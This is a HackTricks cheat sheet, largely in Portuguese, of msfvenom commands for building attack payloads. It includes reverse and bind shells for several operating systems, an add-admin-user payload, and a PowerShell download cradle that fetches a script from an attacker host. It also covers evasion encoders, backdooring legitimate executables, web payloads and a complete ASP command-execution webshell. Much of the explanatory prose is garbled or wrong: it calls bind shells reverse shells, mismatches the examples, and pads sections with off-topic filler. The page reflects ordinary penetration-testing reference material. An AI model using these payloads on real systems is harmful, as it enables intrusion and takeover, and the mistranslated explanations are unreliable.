# MSFVenom - CheatSheet

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof é o lar de todas as recompensas por bugs de criptografia.**

**Seja recompensado sem atrasos**\
As recompensas do HackenProof são lançadas apenas quando seus clientes depositam o orçamento de recompensa. Você receberá a recompensa após a verificação do bug.

**Adquira experiência em pentesting web3**\
Protocolos blockchain e contratos inteligentes são a nova Internet! Domine a segurança web3 em seus dias de ascensão.

**Torne-se a lenda do hacker web3**\
Ganhe pontos de reputação com cada bug verificado e conquiste o topo do leaderboard semanal.

[**Cadastre-se no HackenProof**](https://hackenproof.com/register) comece a ganhar com seus hacks!

{% embed url="https://hackenproof.com/register" %}

***

`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`

Também é possível usar o `-a` para especificar a arquitetura ou a `--platform`

## Listagem
```bash
msfvenom -l payloads #Payloads
msfvenom -l encoders #Encoders
```
## Parâmetros comuns ao criar um shellcode

Ao criar um shellcode, existem alguns parâmetros comuns que podem ser utilizados para personalizar o código gerado. Esses parâmetros permitem que você defina o tipo de payload, a arquitetura do sistema alvo, o formato de saída e outras opções relevantes. Abaixo estão alguns dos parâmetros mais comuns:

- **Payload**: Especifica o tipo de payload que será usado no shellcode, como um shell reverso ou um payload de execução de comandos.
- **Arquitetura**: Define a arquitetura do sistema alvo, como x86, x64 ou ARM.
- **Formato de saída**: Determina o formato de saída do shellcode, como raw, exe, elf ou macho.
- **Bad characters**: Permite especificar caracteres que devem ser evitados no shellcode, como caracteres nulos ou caracteres que podem causar problemas de codificação.
- **Encoder**: Define o encoder a ser usado para ofuscar o shellcode e evitar detecção, como o encoder XOR ou o encoder Shikata Ga Nai.
- **Tamanho**: Especifica o tamanho máximo do shellcode gerado.
- **Endereço de retorno**: Define o endereço de retorno para o shellcode, geralmente usado em ataques de estouro de buffer.

Esses parâmetros podem ser ajustados de acordo com as necessidades específicas do seu teste de penetração, permitindo que você crie um shellcode personalizado e eficaz para explorar vulnerabilidades em sistemas alvo.
```bash
-b "\x00\x0a\x0d"
-f c
-e x86/shikata_ga_nai -i 5
EXITFUNC=thread
PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
```
O shell reverso é uma técnica comum usada em testes de penetração para obter acesso remoto a um sistema Windows. Ele permite que um invasor estabeleça uma conexão de rede de volta ao seu próprio sistema, fornecendo assim controle total sobre o sistema alvo.

O Metasploit Framework fornece uma ferramenta chamada `msfvenom` que pode ser usada para gerar payloads de shell reverso para sistemas Windows. O `msfvenom` permite personalizar o payload de acordo com as necessidades do invasor, como o endereço IP e a porta para a conexão reversa.

Aqui está um exemplo de como usar o `msfvenom` para gerar um payload de shell reverso para um sistema Windows:

```plaintext
msfvenom -p windows/shell_reverse_tcp LHOST=<seu endereço IP> LPORT=<sua porta> -f exe > shell.exe
```

Neste exemplo, substitua `<seu endereço IP>` pelo endereço IP do seu sistema e `<sua porta>` pela porta que você deseja usar para a conexão reversa.

Depois de gerar o payload, você pode transferi-lo para o sistema alvo e executá-lo. Assim que o payload for executado, ele estabelecerá uma conexão reversa com o seu sistema, permitindo que você execute comandos no sistema alvo.

É importante lembrar que o uso de técnicas de hacking como o shell reverso em sistemas sem permissão é ilegal e pode resultar em consequências legais graves. Portanto, sempre obtenha permissão por escrito antes de realizar qualquer teste de penetração.
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
```
### Bind Shell

Uma bind shell é um tipo de shell reversa que permite que um invasor se conecte a um sistema comprometido e obtenha acesso ao shell do sistema. Ao contrário de uma shell reversa, onde o invasor inicia a conexão, em uma bind shell o sistema comprometido aguarda por uma conexão do invasor.

O `msfvenom` é uma ferramenta poderosa do Metasploit Framework que permite gerar payloads personalizados para exploração de vulnerabilidades. Com o `msfvenom`, é possível criar um payload para uma bind shell e injetá-lo em um sistema alvo.

A sintaxe básica para gerar um payload de bind shell usando o `msfvenom` é a seguinte:

```
msfvenom -p <payload> LHOST=<seu endereço IP> LPORT=<porta> -f <formato> -o <arquivo de saída>
```

- `<payload>`: o payload específico que você deseja usar, como `windows/meterpreter/reverse_tcp` ou `linux/x86/meterpreter/reverse_tcp`.
- `<seu endereço IP>`: o endereço IP do seu sistema.
- `<porta>`: a porta que será usada para a conexão.
- `<formato>`: o formato de saída desejado, como `exe`, `elf` ou `raw`.
- `<arquivo de saída>`: o nome do arquivo de saída onde o payload será salvo.

Por exemplo, para gerar um payload de bind shell para um sistema Windows, usando o payload `windows/meterpreter/reverse_tcp`, com seu endereço IP sendo `192.168.0.100` e a porta `4444`, no formato `exe` e salvando-o como `payload.exe`, você pode usar o seguinte comando:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f exe -o payload.exe
```

Depois de gerar o payload, você pode implantá-lo no sistema alvo e iniciar uma conexão reversa usando uma ferramenta como o Metasploit Framework. Isso permitirá que você obtenha acesso ao shell do sistema comprometido e execute comandos nele.
```bash
msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
```
### Criar Usuário

O comando `msfvenom` pode ser usado para criar um payload que cria um novo usuário em um sistema alvo. O payload pode ser personalizado para atender às necessidades específicas do ataque.

Aqui está um exemplo de como criar um payload que cria um usuário com o nome de usuário "hacker" e a senha "password123":

```
msfvenom -p windows/adduser USER=hacker PASS=password123 -f exe > adduser.exe
```

Este comando cria um arquivo executável chamado "adduser.exe" que, quando executado no sistema alvo, adiciona um novo usuário com as credenciais especificadas.

Certifique-se de adaptar o comando de acordo com o sistema operacional e as configurações do alvo.
```bash
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
```
### Shell CMD

O shell CMD é um shell de comando do Windows que permite aos usuários interagir com o sistema operacional por meio de comandos de texto. É uma ferramenta poderosa para executar tarefas administrativas e automatizar processos no Windows.

O shell CMD pode ser usado para executar comandos, scripts e programas no Windows. Ele fornece uma interface de linha de comando onde os usuários podem digitar comandos e receber saídas correspondentes. O shell CMD também suporta a execução de scripts em lotes, que são arquivos de texto contendo uma sequência de comandos a serem executados em ordem.

Para abrir o shell CMD, você pode pressionar a tecla Windows + R para abrir a caixa de diálogo Executar e digitar "cmd" antes de pressionar Enter. Isso abrirá uma janela do shell CMD onde você pode começar a digitar comandos.

O shell CMD oferece uma ampla gama de comandos e recursos que podem ser usados para realizar várias tarefas, como gerenciamento de arquivos, configuração de rede, execução de programas e muito mais. É uma ferramenta essencial para administradores de sistemas e usuários avançados do Windows.
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
```
### **Executar Comando**

The `msfvenom` tool can be used to generate payloads that allow for command execution on a target system. This can be useful during a penetration test to gain remote access and control over the target.

To generate a payload that executes a command, you can use the following command:

```
msfvenom -p cmd/unix/reverse_netcat LHOST=<attacker IP> LPORT=<attacker port> -f <output format> -o <output file>
```

Replace `<attacker IP>` with the IP address of the machine running the listener, and `<attacker port>` with the port number on which the listener is running.

The `<output format>` can be any format supported by `msfvenom`, such as `raw`, `elf`, `exe`, `dll`, `psh`, `asp`, `jsp`, `war`, `pl`, `py`, `rb`, `ps1`, `hta`, `c`, `cpp`, `java`, `msi`, `msu`, `vba`, `vbs`, `hta-psh`, `asp-psh`, `jsp-psh`, `war-psh`, `pl-psh`, `py-psh`, `rb-psh`, `ps1-psh`, `c-psh`, `cpp-psh`, `java-psh`, `msi-psh`, `msu-psh`, `vba-psh`, or `vbs-psh`.

The `<output file>` is the name of the file that will contain the generated payload.

Once the payload is generated, you can transfer it to the target system and execute it to gain command execution.

Note: It is important to ensure that you have proper authorization and legal permission before attempting to execute commands on a target system.
```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
```
### Codificador

O codificador é uma ferramenta essencial no arsenal de um hacker. Ele é usado para ofuscar o payload e evitar a detecção pelos sistemas de segurança. O Metasploit Framework fornece uma variedade de codificadores que podem ser usados com o `msfvenom` para criar payloads personalizados.

#### Codificadores disponíveis

Aqui estão alguns dos codificadores disponíveis no Metasploit Framework:

- `x86/shikata_ga_nai`: Este codificador é baseado em metamorfismo e é altamente eficaz na evasão de detecção. Ele é capaz de gerar várias variantes do payload, tornando-o difícil de ser detectado por soluções de segurança.

- `x86/jmp_call_additive`: Este codificador usa instruções `jmp` e `call` para ofuscar o payload. Ele adiciona um valor aleatório ao endereço de destino, tornando-o mais difícil de ser detectado por análise estática.

- `x86/countdown`: Este codificador usa uma técnica de contagem regressiva para ofuscar o payload. Ele adiciona instruções extras antes do payload real, o que pode confundir os sistemas de detecção.

#### Uso do codificador

Para usar um codificador com o `msfvenom`, você precisa especificar o codificador desejado usando a opção `-e` ou `--encoder`. Por exemplo, para usar o codificador `x86/shikata_ga_nai`, você pode usar o seguinte comando:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<seu endereço IP> LPORT=<sua porta> -e x86/shikata_ga_nai -i 3 -f exe -o payload.exe
```

Neste exemplo, o payload será codificado usando o codificador `x86/shikata_ga_nai` com um fator de iteração de 3. O payload codificado será salvo em um arquivo chamado `payload.exe`.

Experimente diferentes codificadores e fatores de iteração para encontrar a combinação que melhor evita a detecção pelos sistemas de segurança.
```bash
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```
### Incorporado dentro do executável

O `msfvenom` pode ser usado para incorporar um payload dentro de um executável existente. Isso permite que você execute o payload sem chamar a atenção, pois ele estará oculto dentro do arquivo executável original.

Para incorporar um payload em um executável, você precisa especificar o tipo de payload, a arquitetura do sistema alvo, o formato do arquivo de saída e o nome do arquivo de entrada. Por exemplo, para incorporar um payload do tipo `windows/meterpreter/reverse_tcp` em um executável de 32 bits chamado `original.exe`, você pode usar o seguinte comando:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<seu endereço IP> LPORT=<sua porta> -f exe -a x86 --platform windows -x original.exe -k -o embedded.exe
```

Neste exemplo, o `msfvenom` criará um novo arquivo chamado `embedded.exe`, que conterá o payload incorporado. Quando o `embedded.exe` for executado no sistema alvo, o payload será ativado e estabelecerá uma conexão reversa com o endereço IP e porta especificados.

Certifique-se de que o executável original seja compatível com a arquitetura do sistema alvo e que você tenha permissão legal para incorporar um payload nele. O uso indevido dessa técnica pode ser ilegal e violar a privacidade e a segurança de terceiros.
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
```
### Shell Reverso

O shell reverso é uma técnica comumente usada em testes de penetração para obter acesso remoto a um sistema Linux. Ele permite que um invasor estabeleça uma conexão de rede reversa com a máquina alvo, fornecendo assim controle total sobre o sistema.

#### Gerando um Payload com o msfvenom

O msfvenom é uma ferramenta poderosa do Metasploit Framework que permite gerar payloads personalizados para várias plataformas. Para gerar um payload de shell reverso para Linux, você pode usar o seguinte comando:

```plaintext
msfvenom -p <payload> LHOST=<seu endereço IP> LPORT=<porta> -f <formato> -o <arquivo de saída>
```

Substitua `<payload>` pelo payload desejado, `<seu endereço IP>` pelo seu endereço IP público ou privado, `<porta>` pela porta desejada para a conexão reversa, `<formato>` pelo formato de saída desejado (por exemplo, elf, raw, etc.) e `<arquivo de saída>` pelo nome do arquivo de saída desejado.

Por exemplo, para gerar um payload de shell reverso em formato elf com o payload linux/x86/shell_reverse_tcp, usando o endereço IP 192.168.0.10 e a porta 4444, você pode executar o seguinte comando:

```plaintext
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.10 LPORT=4444 -f elf -o shell.elf
```

#### Executando o Payload

Depois de gerar o payload, você precisa transferi-lo para o sistema alvo e executá-lo. Existem várias maneiras de fazer isso, como usar um servidor web, enviar por e-mail ou usar uma mídia removível.

Uma vez que o payload esteja no sistema alvo, você pode executá-lo usando um comando como:

```plaintext
./shell.elf
```

Isso iniciará o shell reverso e estabelecerá uma conexão com o endereço IP e porta especificados no payload. Agora você terá controle remoto sobre o sistema alvo.
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```
### Bind Shell

Uma bind shell é um tipo de shell reversa que permite que um invasor se conecte a um sistema comprometido e obtenha acesso ao shell do sistema. Ao contrário de uma shell reversa, onde o invasor inicia a conexão, em uma bind shell o sistema comprometido aguarda por uma conexão do invasor.

O `msfvenom` é uma ferramenta poderosa do Metasploit Framework que permite gerar payloads personalizados para exploração de vulnerabilidades. Com o `msfvenom`, é possível criar um payload para uma bind shell e injetá-lo em um sistema alvo.

A sintaxe básica para gerar um payload de bind shell usando o `msfvenom` é a seguinte:

```
msfvenom -p <payload> LHOST=<seu endereço IP> LPORT=<porta> -f <formato> -o <arquivo de saída>
```

- `<payload>`: o payload específico que você deseja usar, como `windows/meterpreter/reverse_tcp` ou `linux/x86/meterpreter/reverse_tcp`.
- `<seu endereço IP>`: o endereço IP do seu sistema.
- `<porta>`: a porta que será usada para a conexão.
- `<formato>`: o formato de saída desejado, como `exe`, `elf` ou `raw`.
- `<arquivo de saída>`: o nome do arquivo de saída onde o payload será salvo.

Por exemplo, para gerar um payload de bind shell para um sistema Windows, usando o payload `windows/meterpreter/reverse_tcp`, com seu endereço IP sendo `192.168.0.100` e a porta `4444`, no formato `exe` e salvando-o como `payload.exe`, você pode usar o seguinte comando:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f exe -o payload.exe
```

Depois de gerar o payload, você pode implantá-lo no sistema alvo e iniciar uma conexão reversa usando uma ferramenta como o Metasploit Framework. Isso permitirá que você obtenha acesso ao shell do sistema comprometido e execute comandos nele.
```bash
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
```
### SunOS (Solaris)

O SunOS (Solaris) é um sistema operacional baseado em Unix desenvolvido pela Sun Microsystems. Ele é amplamente utilizado em servidores e estações de trabalho. O Solaris é conhecido por sua estabilidade, segurança e desempenho. Ele oferece uma ampla gama de recursos e funcionalidades avançadas para atender às necessidades dos usuários. O Solaris também suporta uma variedade de arquiteturas de hardware, tornando-o flexível e escalável.
```bash
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
```
### **Shell Reverso:**

O shell reverso é uma técnica comum usada em pentest para estabelecer uma conexão reversa entre o alvo e o atacante. Isso permite que o atacante controle remotamente o sistema comprometido. O Metasploit Framework fornece uma ferramenta chamada `msfvenom` que pode ser usada para gerar payloads de shell reverso para sistemas operacionais MAC.

Para gerar um payload de shell reverso para um sistema MAC, você pode usar o seguinte comando:

```
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<seu endereço IP> LPORT=<porta> -f <formato> > <nome_do_arquivo>
```

Substitua `<seu endereço IP>` pelo endereço IP do seu servidor de escuta e `<porta>` pela porta que você deseja usar para a conexão reversa. `<formato>` pode ser substituído por `elf`, `macho`, `app`, `jar` ou `dmg`, dependendo do formato de arquivo desejado para o payload. `<nome_do_arquivo>` é o nome do arquivo de saída que conterá o payload gerado.

Depois de gerar o payload, você pode implantá-lo no sistema MAC alvo e iniciar o servidor de escuta no seu lado para estabelecer a conexão reversa.
```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
```
A **Bind Shell** is a type of shell that listens for incoming connections on a specific port. Once a connection is established, the shell provides a command-line interface to interact with the target system. This type of shell is commonly used in scenarios where the attacker has control over the target network and wants to gain access to a specific system.

To create a bind shell payload using `msfvenom`, you can use the following command:

```plaintext
msfvenom -p <payload> LHOST=<attacker IP> LPORT=<port> -f <format> -o <output file>
```

- `<payload>`: The payload to use for the bind shell. This can be any payload supported by `msfvenom`, such as `windows/meterpreter/reverse_tcp` or `linux/x86/shell/bind_tcp`.
- `<attacker IP>`: The IP address of the attacker machine.
- `<port>`: The port on which the bind shell will listen for incoming connections.
- `<format>`: The output format for the payload, such as `exe`, `elf`, or `raw`.
- `<output file>`: The file to which the payload will be written.

For example, to create a bind shell payload using the `windows/meterpreter/reverse_tcp` payload, with the attacker IP set to `192.168.0.100` and the bind shell listening on port `4444`, you can use the following command:

```plaintext
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f exe -o bind_shell.exe
```

This will generate an executable file named `bind_shell.exe` that, when executed on the target system, will establish a reverse TCP connection to the attacker machine on port `4444`, providing a bind shell interface.
```bash
msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
```
## **Cargas úteis baseadas na web**

### **PHP**

#### Shell reverso
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
O seguinte é um exemplo de um shell reverso em ASP/x:

```asp
<%@ Language=VBScript %>
<%
    Dim cmd
    cmd = Request.QueryString("cmd")
    If cmd <> "" Then
        Dim oShell
        Set oShell = CreateObject("WScript.Shell")
        Dim oExec
        Set oExec = oShell.Exec(cmd)
        Dim output
        output = oExec.StdOut.ReadAll()
        Response.Write(output)
    End If
%>
```

Este código permite executar comandos no servidor alvo através de uma solicitação GET. Para usar o shell reverso, você precisa enviar uma solicitação GET com o parâmetro `cmd` contendo o comando que deseja executar. O resultado do comando será retornado como resposta.

Para criar um payload ASP/x usando o `msfvenom`, você pode usar o seguinte comando:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<seu endereço IP> LPORT=<sua porta> -f asp > shell.asp
```

Substitua `<seu endereço IP>` pelo seu endereço IP e `<sua porta>` pela porta que deseja usar para a conexão reversa.

Depois de gerar o payload, você pode fazer o upload do arquivo `shell.asp` para o servidor alvo e acessá-lo através de uma solicitação GET para obter acesso ao shell reverso. Certifique-se de que o servidor esteja configurado para executar arquivos ASP/x.
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```
O seguinte é um exemplo de um shell reverso em JSP usando o msfvenom:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<seu endereço IP> LPORT=<sua porta> -f war > shell.war
```

Este comando irá gerar um arquivo WAR chamado `shell.war` que contém o shell reverso em JSP. Você pode implantar esse arquivo em um servidor web compatível com JSP para estabelecer uma conexão reversa com o seu sistema.

Certifique-se de substituir `<seu endereço IP>` pelo seu endereço IP e `<sua porta>` pela porta que você deseja usar para a conexão reversa.

Depois de implantar o arquivo WAR em um servidor web, você pode acessar o shell reverso em JSP usando o seguinte URL:

```
http://<endereço IP do servidor>/<caminho para o arquivo WAR>/shell.jsp
```

Isso permitirá que você execute comandos no sistema remoto através do shell reverso em JSP.
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
```
A técnica de Reverse Shell é usada para estabelecer uma conexão entre o atacante e o alvo, permitindo que o atacante controle o sistema comprometido remotamente. O atacante envia um payload malicioso para o sistema alvo, que, quando executado, estabelece uma conexão de volta ao atacante. Isso permite que o atacante execute comandos no sistema alvo e obtenha acesso remoto completo.

O Metasploit Framework fornece uma ferramenta chamada `msfvenom` que pode ser usada para gerar payloads maliciosos para diferentes tipos de shells reversos. O `msfvenom` é uma ferramenta poderosa que permite personalizar o payload de acordo com as necessidades do atacante.

Aqui está um exemplo de como gerar um payload de Reverse Shell usando o `msfvenom`:

```plaintext
msfvenom -p <payload> LHOST=<seu endereço IP> LPORT=<porta> -f <formato> -o <arquivo de saída>
```

- `<payload>`: O tipo de payload que você deseja gerar, como `windows/meterpreter/reverse_tcp` ou `linux/x86/meterpreter/reverse_tcp`.
- `<seu endereço IP>`: O endereço IP do seu sistema, onde você deseja receber a conexão reversa.
- `<porta>`: A porta na qual você deseja receber a conexão reversa.
- `<formato>`: O formato de saída desejado, como `exe`, `elf` ou `raw`.
- `<arquivo de saída>`: O nome do arquivo de saída onde o payload será salvo.

Depois de gerar o payload, você pode enviá-lo para o sistema alvo e executá-lo. Assim que o payload for executado, uma conexão reversa será estabelecida e você poderá controlar o sistema alvo remotamente.

É importante lembrar que o uso de técnicas de hacking sem autorização é ilegal e pode resultar em consequências legais graves. Este conhecimento deve ser usado apenas para fins educacionais e éticos.
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
```
### NodeJS

NodeJS é uma plataforma de desenvolvimento de aplicativos de código aberto que permite a execução de JavaScript no lado do servidor. Ele utiliza o mecanismo de JavaScript do Chrome para fornecer um ambiente de execução rápido e eficiente. O NodeJS é amplamente utilizado para criar aplicativos web escaláveis e em tempo real, bem como para desenvolver ferramentas de linha de comando.

#### Benefícios do NodeJS

- **Desempenho**: O NodeJS é conhecido por seu desempenho excepcionalmente rápido devido ao seu modelo de E/S não bloqueante. Isso permite que o NodeJS lide com um grande número de conexões simultâneas sem sobrecarregar o servidor.

- **Escalabilidade**: O NodeJS é altamente escalável, permitindo que os aplicativos lidem com um grande número de solicitações simultâneas de forma eficiente. Ele também suporta a criação de aplicativos em tempo real, como bate-papos e jogos multiplayer.

- **Ecossistema robusto**: O NodeJS possui um ecossistema rico de módulos e bibliotecas que podem ser facilmente instalados e usados em seus projetos. Isso permite que os desenvolvedores aproveitem uma ampla gama de recursos e funcionalidades prontas para uso.

- **Facilidade de desenvolvimento**: O NodeJS utiliza JavaScript, uma linguagem de programação popular e amplamente adotada, o que torna mais fácil para os desenvolvedores criar aplicativos web e compartilhar código entre o lado do cliente e o lado do servidor.

- **Comunidade ativa**: O NodeJS possui uma comunidade ativa de desenvolvedores que contribuem com módulos, bibliotecas e recursos úteis. Isso significa que você pode encontrar suporte e soluções para seus problemas de desenvolvimento com facilidade.

#### Conclusão

O NodeJS é uma plataforma poderosa e versátil para o desenvolvimento de aplicativos web escaláveis e em tempo real. Com seu desempenho excepcional, escalabilidade e ecossistema robusto, o NodeJS é uma escolha popular entre os desenvolvedores. Se você está procurando uma solução eficiente para criar aplicativos web de alto desempenho, o NodeJS é definitivamente uma opção a considerar.
```bash
msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
```
## **Cargas úteis de Linguagem de Script**

### **Perl**
```bash
msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
```
### **Python**

Python is a versatile and powerful programming language that is widely used in the field of hacking. It provides a wide range of libraries and frameworks that make it easier to develop hacking tools and scripts. Python's simplicity and readability make it an ideal choice for both beginners and experienced hackers.

Python can be used for various hacking tasks, such as network scanning, vulnerability assessment, exploit development, and post-exploitation activities. Its extensive standard library and third-party modules allow hackers to easily manipulate network packets, interact with databases, and perform various cryptographic operations.

In addition to its built-in capabilities, Python also supports the use of external tools and frameworks. One such tool is Metasploit, which is a popular framework for developing and executing exploits. Python can be used with Metasploit to create custom payloads and generate shellcode.

Python's versatility extends to its ability to run on multiple platforms, including Windows, Linux, and macOS. This makes it a convenient choice for hackers who need to work across different operating systems.

Overall, Python is a valuable tool for hackers due to its flexibility, ease of use, and extensive library support. Whether you are a beginner or an experienced hacker, Python can help you streamline your hacking activities and enhance your overall effectiveness.
```bash
msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
```
### **Bash**

Bash é uma linguagem de script amplamente utilizada em sistemas operacionais baseados em Unix. É uma das shells mais populares e oferece uma ampla gama de recursos e funcionalidades. O Bash é conhecido por sua flexibilidade e facilidade de uso, tornando-o uma escolha popular entre os hackers.

#### **Injeção de código Bash**

A injeção de código Bash é uma técnica comum usada por hackers para explorar vulnerabilidades em sistemas. Envolve a inserção de comandos Bash maliciosos em entradas de usuário não filtradas, permitindo que os hackers executem comandos arbitrários no sistema alvo.

#### **Execução de comandos Bash**

A execução de comandos Bash é uma técnica usada para executar comandos Bash em um sistema remoto. Os hackers podem explorar vulnerabilidades em sistemas para obter acesso não autorizado e executar comandos Bash para obter informações confidenciais ou realizar atividades maliciosas.

#### **Scripts Bash maliciosos**

Os scripts Bash maliciosos são programas de script escritos em Bash que são projetados para realizar atividades maliciosas em um sistema. Esses scripts podem ser usados para roubar informações confidenciais, comprometer a segurança do sistema ou realizar outras atividades prejudiciais.

#### **Shell reversa Bash**

Uma shell reversa Bash é uma conexão de rede estabelecida entre um sistema comprometido e um sistema controlado pelo hacker. Isso permite que o hacker controle remotamente o sistema comprometido e execute comandos Bash nele.

#### **Payloads Bash**

Payloads Bash são códigos maliciosos que são executados em sistemas alvo para realizar atividades maliciosas. Eles podem ser usados para explorar vulnerabilidades em sistemas, obter acesso não autorizado, roubar informações confidenciais ou realizar outras atividades prejudiciais.

#### **Ferramentas Bash**

Existem várias ferramentas Bash disponíveis para hackers, que podem ser usadas para automatizar tarefas, explorar vulnerabilidades e realizar atividades maliciosas. Algumas das ferramentas Bash populares incluem o Metasploit Framework, o Shellshock, o Wget e o cURL.
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```
<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof é o lar de todas as recompensas por bugs de criptografia.**

**Seja recompensado sem atrasos**\
As recompensas do HackenProof são lançadas apenas quando seus clientes depositam o orçamento de recompensa. Você receberá a recompensa após a verificação do bug.

**Adquira experiência em pentesting web3**\
Protocolos de blockchain e contratos inteligentes são a nova Internet! Domine a segurança web3 em seus dias de ascensão.

**Torne-se uma lenda hacker web3**\
Ganhe pontos de reputação com cada bug verificado e conquiste o topo do leaderboard semanal.

[**Cadastre-se no HackenProof**](https://hackenproof.com/register) e comece a ganhar com seus hacks!

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? Ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
